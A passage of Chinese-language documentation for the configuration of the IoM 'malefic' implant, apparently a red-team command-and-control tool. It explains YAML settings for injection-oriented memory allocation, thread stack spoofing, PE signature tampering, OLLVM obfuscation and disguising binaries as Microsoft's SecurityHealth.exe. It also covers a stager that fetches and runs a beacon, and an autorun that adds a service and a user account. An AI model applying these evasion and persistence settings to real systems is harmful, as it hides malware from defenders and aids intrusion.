    inprocess: "NtAllocateVirtualMemory"
    # allocter_ex: "VirtualAllocEx", "NtAllocateVirtualMemory",
    #              "VirtualAllocExNuma", "NtMapViewOfSection"
    crossprocess: "NtAllocateVirtualMemory"
  thread_stack_spoofer: true
```

**字段解释：**

- **alloctor**: 内存分配器选择
  - **inprocess**: 进程内分配，可选 `VirtualAlloc`/`HeapAlloc`/`NtAllocateVirtualMemory` 等
  - **crossprocess**: 跨进程分配，用于注入等场景
- **thread_stack_spoofer**: 线程栈欺骗，伪造调用栈以绕过基于调用栈的检测

#### 4.3.7 PE 文件签名修改配置

```yaml
  pe_signature_modify:
    feature: true
    modify:
      magic: "\x00\x00"
      signature: "\x00\x00"
```

**字段解释：**

- **feature**: 是否启用 PE 签名修改功能
- **modify**: 具体修改内容
  - **magic**: 修改 PE 魔术字节，干扰静态检测
  - **signature**: 修改 PE 签名标识，破坏原始签名但可能绕过某些检测

### 4.4 build - 编译构建配置

#### 4.4.1 编译工具链配置

```yaml
build:
  zigbuild: false                        # 是否使用 Zig 交叉编译
  remap: false                           # 是否启用路径重映射
  toolchain: "nightly-2023-09-18"       # Rust 工具链版本
```

**字段说明：**

- **zigbuild**: 使用 Zig 作为 C/C++ 编译器，提供更好的交叉编译支持
- **remap**: 编译时重映射源文件路径，清除构建环境信息
- **toolchain**: 指定 Rust 工具链版本，确保编译环境一致性

#### 4.4.2 OLLVM 混淆配置

!!! important "ollvm相关配置只支持在IoM提供的malefic-builder中使用"

```yaml
build:
  ollvm:
    enable: false                        # 总开关
    bcfobf: false                        # 伪控制流混淆
    splitobf: false                      # 控制流拆分
    subobf: false                        # 指令替换混淆
    fco: false                           # 函数调用混淆
    constenc: false                      # 常量加密
```

**混淆技术说明：**

- **bcfobf**: 插入无用的控制流分支，增加反编译难度
- **splitobf**: 将基本块拆分并重排，破坏原始程序结构
- **subobf**: 用等价但复杂的指令序列替换简单指令
- **fco**: 隐藏真实的函数调用关系
- **constenc**: 运行时解密字符串常量

#### 4.4.3 二进制元数据配置

```yaml
build:
  metadata:
    remap_path: "C:/Windows/System32/"   # 路径重映射
    icon: "assets/app.ico"               # 程序图标
    compile_time: "15 Jun 2019 10:30:00" # 编译时间伪装
    file_version: "10.0.19041.1"        # 文件版本
    product_version: "10.0.19041.1"     # 产品版本
    company_name: "Microsoft Corporation" # 公司名称
    product_name: "Windows Security"    # 产品名称
    original_filename: "SecurityHealth.exe" # 原始文件名
    file_description: "Windows Security Health Service" # 文件描述
    internal_name: "SecurityHealth"     # 内部名称
    require_admin: false                 # 需要管理员权限
    require_uac: false                   # 需要 UAC 提权
```

### 4.5 pulse配置

Pulse 是 IoM 的轻量级 Stager，负责从服务器下载并执行主要的 Beacon 载荷。

其所依赖的配置位于 malefic/config.yaml 文件的 pulse 模块

```yaml
pulse:
  flags:
    start: 0x41             # 交互 body 的开始标志
    end: 0x42               # 交互 body 的结束标志
    magic: "beautiful"      # 随机校验
    artifact_id: 0          # 用于控制所拉取的阶段
  encryption: xor           # body 加密方式 (目前为 xor)
  key: "maliceofinternal"   # 加密的 `key` 值
  target: 127.0.0.1:80     # 目标服务器地址  
  protocol: "http"          # 通信协议
  http:
    method: "POST"
    path: "/pulse"
    host: "127.0.0.1"
    version: "1.1"
    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
```

### 4.6 autorun配置

autorun本质上是将protobuf 转为yaml, 在编译时会重新还原为protobuf并加密保存到二进制文件中。 

因此具体完整的能力implant的能力， 所有能通过各种插件实现的功能都可以通过autorun实现。

yaml示例:

```yaml
-  
  name: bof  
  body: !ExecuteBinary  
    name: service  
    bin: !File "addservice.o"
-
  name: exe
  body: !ExecRequest
    args:
      - net
      - user
      - add
      - ....
  
```